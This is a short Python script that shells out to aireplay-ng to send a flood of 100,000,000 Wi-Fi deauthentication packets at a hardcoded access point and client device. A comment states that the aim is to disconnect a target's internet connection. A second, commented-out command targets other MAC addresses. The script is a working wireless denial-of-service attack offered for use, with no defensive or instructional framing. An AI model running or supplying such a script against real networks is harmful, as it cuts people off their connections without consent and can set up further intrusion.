#!/usr/bin/env python

import subprocess as s

interface = "wlan0"
airmon_interface = "wlan0mon"

# To Interupt and disconnect target's internet connection on WIFI
#                      number of packets, -a BSSIF  -c STATION a.k.a Device connected to router.
# aireplay-ng --deauth 100000000 -a 20:4E:7F:96:16:AA -c 82:B9:8B:C9:52:69 wlan0mon

s.call(
    "aireplay-ng --deauth 100000000 -a 60:E3:27:93:8B:1B -c 5C:AA:FD:C2:B1:34 wlan0mon",
    shell=True)
